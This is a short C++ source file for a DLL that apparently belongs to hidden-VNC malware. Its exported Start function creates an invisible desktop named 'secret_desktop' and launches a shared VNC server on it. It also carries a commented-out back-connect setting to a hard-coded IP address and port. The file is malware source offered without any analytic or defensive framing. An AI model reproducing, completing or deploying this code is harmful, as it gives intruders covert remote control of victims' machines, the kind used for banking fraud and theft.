// hvnc_dll.cpp : Defines the exported functions for the DLL application.
//

#include <windows.h>
#include <hvnc.h>

#define EXPORT_API __declspec(dllexport) __stdcall

DWORD EXPORT_API Start( int port )
{
	int ret = 1;
	if (VNCInit(true))
    {
		HVNC_INITIALIZE vnc_init={0};
        lstrcpyA(vnc_init.szDeskName,"secret_desktop");
        HVNC hSecretDesktop = VNCCreateServer(&vnc_init);

        HVNC_CONNECTION_INFO conn={0};
        //lstrcpyA(conn.szBCHost,"188.72.202.163");
        //conn.wBCPort=50000;
        conn.wVNCPort = 5900;
        conn.bShared = true;
        VNCStartServer(hSecretDesktop,&conn);

		OutputDebugString("1");
		while( VNCGetServerStatus(hSecretDesktop) == HVNC_SERVER_STARTED )
			Sleep(1);
		OutputDebugString("2");
		ret = 0;
	}
	return ret;
}

